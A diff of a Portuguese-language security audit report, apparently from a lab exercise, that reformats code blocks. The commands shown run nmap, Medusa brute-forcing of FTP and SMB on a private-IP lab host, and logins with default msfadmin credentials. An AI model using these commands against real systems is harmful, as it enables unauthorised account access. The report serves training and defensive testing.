@@ -68,14 +68,14 @@ Este relatório documenta uma auditoria de segurança focada na simulação de a
 nmap -sV -p21 192.168.227.128 | tee nmap_ftp.txt
 
 # Comando de Execução (Medusa)
-`medusa -M ftp -h 192.168.227.128 -U wordlists/users.txt -P wordlists/ftp_passwords.txt -t 4 -v 4 -f |& tee medusa_ftp_run.log`
+medusa -M ftp -h 192.168.227.128 -U wordlists/users.txt -P wordlists/ftp_passwords.txt -t 4 -v 4 -f |& tee medusa_ftp_run.log
 
 # Validação manual (exemplo) 
 Use um cliente FTP para validar qualquer credencial encontrada:
-`ftp 192.168.227.128
+ftp 192.168.227.128
 # ou, se preferir, use um cliente que permita user%pass no comando:
 # curl --ftp-ssl -u user:password ftp://192.168.227.128/
-
+```
 ---
 
 ### Cenário 2: Quebra de Senha no Serviço SMB (Medusa)
@@ -105,7 +105,7 @@ smbclient //192.168.227.128/IPC$ -U 'msfadmin%msfadmin' -W WORKGROUP -c 'ls; exi
 # Extra: extrair resultados do log do Medusa
 # procurar linhas que indiquem sucesso
 grep -E "SUCCESS|FOUND|LOGIN" -i medusa_smb_run.log || true
-
+```
 ---
 
 ## III. Recomendações de Mitigação e Defesa
